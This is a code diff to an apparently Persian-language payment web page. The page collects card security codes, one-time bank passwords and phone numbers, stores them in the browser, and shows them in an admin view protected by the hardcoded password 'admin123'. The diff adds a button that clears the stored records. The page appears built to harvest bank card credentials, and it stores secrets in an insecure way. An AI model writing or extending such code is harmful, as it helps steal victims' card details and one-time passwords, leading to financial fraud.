@@ -131,6 +131,18 @@
             border-radius: 5px;
             cursor: pointer;
         }
+        .clear-data-btn {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            background: #ff5733;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+            display: none;
+        }
         @media (max-width: 600px) {
             .payment-form, .admin-section {
                 width: 95%;
@@ -210,6 +222,7 @@
             <button type="button" onclick="showAdminData()">تأیید</button>
         </div>
         <pre id="admin-data" style="display: none;"></pre>
+        <button class="clear-data-btn" id="clear-data-btn" onclick="clearPaymentData()">پاک کردن اطلاعات</button>
     </div>
 
     <script>
@@ -244,9 +257,8 @@
             return Math.floor(1000 + Math.random() * 9000).toString();
         }
 
-        // تابع تشخیص استان بر اساس شماره تلفن
         function detectProvinceFromPhone(phoneNumber) {
-            const prefix = phoneNumber.replace(/[-\s]/g, '').slice(0, 4); // گرفتن 4 رقم اول بدون خط تیره
+            const prefix = phoneNumber.replace(/[-\s]/g, '').slice(0, 4);
             const provinceMap = {
                 "0912": "تهران",
                 "0913": "اصفهان",
@@ -286,7 +298,7 @@
                     "security_code": data.get("security-code"),
                     "otp_code": data.get("otp-code"),
                     "phone_number": phoneNumber,
-                    "province": province, // اضافه کردن استان
+                    "province": province,
                     "timestamp": new Date().toISOString()
                 };
 
@@ -348,14 +360,25 @@
         function showAdminData() {
             const password = document.getElementById('admin-pass').value;
             const adminData = document.getElementById('admin-data');
+            const clearDataBtn = document.getElementById('clear-data-btn');
 
             if (password === "admin123") {
                 const storedData = JSON.parse(localStorage.getItem('paymentData')) || [];
                 adminData.textContent = JSON.stringify(storedData, null, 2);
                 adminData.style.display = 'block';
+                clearDataBtn.style.display = 'block'; // نمایش دکمه پاک کردن اطلاعات
             } else {
                 alert("رمز مدیر اشتباه است!");
                 adminData.style.display = 'none';
+                clearDataBtn.style.display = 'none'; // مخفی کردن دکمه در صورت رمز اشتباه
+            }
+        }
+
+        function clearPaymentData() {
+            if (confirm("آیا مطمئن هستید که می‌خواهید تمام اطلاعات را پاک کنید؟")) {
+                localStorage.removeItem('paymentData');
+                document.getElementById('admin-data').textContent = 'هیچ اطلاعاتی موجود نیست';
+                alert("تمام اطلاعات با موفقیت پاک شدند.");
             }
         }
 
